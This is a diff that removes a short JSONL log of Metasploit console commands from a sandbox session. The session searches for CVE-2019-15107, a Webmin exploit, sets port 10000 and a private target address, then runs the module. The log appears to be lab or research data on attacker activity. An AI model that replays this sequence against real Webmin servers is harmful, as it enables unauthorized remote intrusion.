@@ -1,7 +1,0 @@
-{"sandbox_id": "26", "timestamp_str": "2021-04-22T14:33:34.225Z", "cmd_type": "msf-command", "cmd": "search 2019-15107"}
-{"sandbox_id": "26", "timestamp_str": "2021-04-22T14:33:43.641Z", "cmd_type": "msf-command", "cmd": "use 0"}
-{"sandbox_id": "26", "timestamp_str": "2021-04-22T14:33:58.086Z", "cmd_type": "msf-command", "cmd": "options"}
-{"sandbox_id": "26", "timestamp_str": "2021-04-22T14:34:42.001Z", "cmd_type": "msf-command", "cmd": "set rport 10000"}
-{"sandbox_id": "26", "timestamp_str": "2021-04-22T14:35:15.061Z", "cmd_type": "msf-command", "cmd": "run"}
-{"sandbox_id": "26", "timestamp_str": "2021-04-22T14:35:29.891Z", "cmd_type": "msf-command", "cmd": "set rhost 172.18.1.5"}
-{"sandbox_id": "26", "timestamp_str": "2021-04-22T14:35:32.345Z", "cmd_type": "msf-command", "cmd": "run"}
